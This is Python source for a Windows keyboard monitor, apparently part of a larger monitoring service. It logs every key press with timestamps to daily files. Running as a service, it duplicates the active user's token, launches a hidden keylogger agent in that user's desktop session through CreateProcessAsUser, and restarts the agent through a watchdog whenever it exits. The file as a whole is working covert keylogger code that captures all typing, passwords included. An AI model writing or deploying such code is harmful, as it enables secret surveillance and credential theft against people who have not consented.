"""
Keyboard monitor – logs key presses to a local log file.

Strategy
--------
* In interactive sessions (debug mode) pynput is used directly in-process.
* In Windows Service (Session 0) pynput cannot reach the user's keyboard.
  Instead, the monitor spawns ``keylogger_agent.py`` as a child process inside
  the active interactive user session via ``CreateProcessAsUser``, so pynput
  runs with access to the user's desktop.  The agent writes directly to the
  same log file.
"""

import os
import logging
import threading
from datetime import datetime

from pynput import keyboard

import sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import config
from monitoring.utils import dated_subdir

logger = logging.getLogger(__name__)

_AGENT_SCRIPT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger_agent.py")


def _resolve_python_executable() -> str:
    """Resolve a Python executable suitable for launching child agents."""
    executable = sys.executable
    if os.path.basename(executable).lower() == "pythonservice.exe":
        candidate = os.path.join(os.path.dirname(executable), "python.exe")
        if os.path.exists(candidate):
            return candidate
    return executable


def _is_session_0() -> bool:
    """Return True when the current process is running in Windows Session 0."""
    try:
        import ctypes
        ProcessIdToSessionId = ctypes.windll.kernel32.ProcessIdToSessionId
        session = ctypes.c_ulong(0)
        ProcessIdToSessionId(os.getpid(), ctypes.byref(session))
        return session.value == 0
    except Exception:
        return False


def _spawn_agent_in_user_session(log_file: str):
    """
    Use pywin32 to launch ``keylogger_agent.py`` inside the active console
    user session, so pynput has access to the interactive desktop.

    Returns the Win32 process handle (from CreateProcessAsUser), or None on
    failure.  The caller is responsible for closing this handle.
    """
    try:
        import win32ts
        import win32security
        import win32process
        import win32con
        import win32api

        session_id = win32ts.WTSGetActiveConsoleSessionId()
        if session_id == 0xFFFFFFFF:
            logger.warning("Keyboard agent: no active user session found")
            return None

        # WTSQueryUserToken already returns a primary token; duplicate it so
        # we own a handle that CreateProcessAsUser can consume.
        # pywin32 DuplicateTokenEx in this environment expects
        # (ExistingToken, ImpersonationLevel, DesiredAccess, TokenType).
        user_token = win32ts.WTSQueryUserToken(session_id)
        try:
            primary_token = win32security.DuplicateTokenEx(
                user_token,
                win32security.SecurityImpersonation,
                win32con.TOKEN_ALL_ACCESS,
                win32security.TokenPrimary,
            )
        finally:
            win32api.CloseHandle(user_token)

        # Escape any double-quotes in paths before building the command string.
        os.makedirs(config.LOGS_DIR, exist_ok=True)
        diag_log_file = os.path.join(config.LOGS_DIR, "keyboard_agent.log")

        python_exe = _resolve_python_executable().replace('"', '\\"')
        agent_script = _AGENT_SCRIPT.replace('"', '\\"')
        log_file_esc = log_file.replace('"', '\\"')
        diag_log_file_esc = diag_log_file.replace('"', '\\"')
        cmd = (
            f'"{python_exe}" "{agent_script}" '
            f'"{log_file_esc}" "{diag_log_file_esc}"'
        )
        startup = win32process.STARTUPINFO()
        startup.dwFlags = win32con.STARTF_USESHOWWINDOW
        startup.wShowWindow = win32con.SW_HIDE
        startup.lpDesktop = "winsta0\\default"

        try:
            proc_info = win32process.CreateProcessAsUser(
                primary_token,
                None,
                cmd,
                None,
                None,
                False,
                win32con.CREATE_NO_WINDOW,
                None,
                None,
                startup,
            )
        finally:
            # primary_token is no longer needed after CreateProcessAsUser.
            win32api.CloseHandle(primary_token)
        proc_handle, thread_handle, pid, _tid = proc_info
        # Close the thread handle immediately; we only need the process handle.
        win32api.CloseHandle(thread_handle)
        logger.info(
            "Keyboard agent spawned in user session %d (PID %d)", session_id, pid
        )
        return proc_handle
    except Exception as exc:
        logger.warning("Could not spawn keyboard agent in user session: %s", exc)
        return None


class KeyboardMonitor:
    """Records keyboard activity to a timestamped log file."""

    def __init__(self):
        self._listener: keyboard.Listener | None = None
        self._agent_handle = None          # win32 process handle (Session 0 mode)
        self._agent_lock = threading.Lock()
        self._agent_watchdog_thread: threading.Thread | None = None
        self._buffer: list[str] = []
        self._lock = threading.Lock()
        self._flush_thread: threading.Thread | None = None
        self._stop_event = threading.Event()
        self._using_agent = False

    def start(self):
        os.makedirs(config.LOGS_DIR, exist_ok=True)
        self._stop_event.clear()

        if _is_session_0():
            # Running as Windows Service – spawn the agent in the user session.
            logger.info(
                "KeyboardMonitor: detected Session 0, spawning user-session agent"
            )
            handle = _spawn_agent_in_user_session(config.KEYBOARD_LOG_FILE)
            if handle is not None:
                with self._agent_lock:
                    self._agent_handle = handle
                self._using_agent = True
                self._agent_watchdog_thread = threading.Thread(
                    target=self._agent_watchdog_loop,
                    daemon=True,
                    name="keyboard-agent-watchdog",
                )
                self._agent_watchdog_thread.start()
                logger.info("KeyboardMonitor started (user-session agent)")
            else:
                logger.warning(
                    "KeyboardMonitor: could not spawn user-session agent; "
                    "keyboard logging will be unavailable."
                )
            return

        # Interactive session – use pynput directly.
        try:
            self._listener = keyboard.Listener(on_press=self._on_press)
            self._listener.start()
            self._flush_thread = threading.Thread(
                target=self._flush_loop, daemon=True, name="keyboard-flush"
            )
            self._flush_thread.start()
            logger.info("KeyboardMonitor started")
        except Exception as exc:
            logger.warning(
                "Failed to start keyboard monitor: %s. "
                "Keyboard logging will be unavailable.",
                exc,
            )

    def stop(self):
        self._stop_event.set()
        if self._using_agent:
            with self._agent_lock:
                handle = self._agent_handle
                self._agent_handle = None
            if handle is not None:
                try:
                    import win32process
                    import win32api
                    try:
                        win32process.TerminateProcess(handle, 0)
                    except Exception as exc:
                        logger.debug("Error terminating keyboard agent: %s", exc)
                    finally:
                        win32api.CloseHandle(handle)
                except Exception as exc:
                    logger.debug("Error cleaning up keyboard agent handle: %s", exc)
            if self._agent_watchdog_thread:
                self._agent_watchdog_thread.join(timeout=5)
        if self._listener:
            try:
                self._listener.stop()
            except Exception as exc:
                logger.debug("Error stopping keyboard listener: %s", exc)
        if self._flush_thread:
            self._flush_thread.join(timeout=10)
        self._flush()
        logger.info("KeyboardMonitor stopped")

    def _agent_watchdog_loop(self):
        """Respawn the keylogger agent if it exits unexpectedly."""
        try:
            import win32event
            import win32process
            import win32api
        except ImportError:
            return

        while not self._stop_event.wait(10):
            with self._agent_lock:
                handle = self._agent_handle
            if handle is None:
                continue

            status = win32event.WaitForSingleObject(handle, 0)
            if status != win32event.WAIT_OBJECT_0:
                continue

            try:
                exit_code = win32process.GetExitCodeProcess(handle)
            except Exception:
                exit_code = -1

            try:
                win32api.CloseHandle(handle)
            except Exception:
                pass

            with self._agent_lock:
                if self._agent_handle is handle:
                    self._agent_handle = None

            if self._stop_event.is_set():
                break

            logger.warning(
                "Keyboard agent exited unexpectedly (code %s); attempting restart",
                exit_code,
            )
            new_handle = _spawn_agent_in_user_session(config.KEYBOARD_LOG_FILE)
            if new_handle is not None:
                with self._agent_lock:
                    self._agent_handle = new_handle
            else:
                logger.warning("Keyboard agent restart failed; will retry")

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _on_press(self, key):
        try:
            char = key.char if hasattr(key, "char") and key.char else f"[{key.name}]"
        except AttributeError:
            char = str(key)
        entry = f"{datetime.now().isoformat()} {char}\n"
        with self._lock:
            self._buffer.append(entry)

    def _flush_loop(self):
        while not self._stop_event.wait(config.KEYBOARD_FLUSH_INTERVAL):
            self._flush()

    def _flush(self):
        with self._lock:
            if not self._buffer:
                return
            entries, self._buffer = self._buffer, []
        # Daily log file under LOGS_DIR/YYYY/MM/DD/keyboard.log
        day_dir = dated_subdir(config.LOGS_DIR)
        log_file = os.path.join(day_dir, "keyboard.log")
        try:
            with open(log_file, "a", encoding="utf-8") as fh:
                fh.writelines(entries)
        except OSError:
            logger.exception("Failed to flush keyboard log")
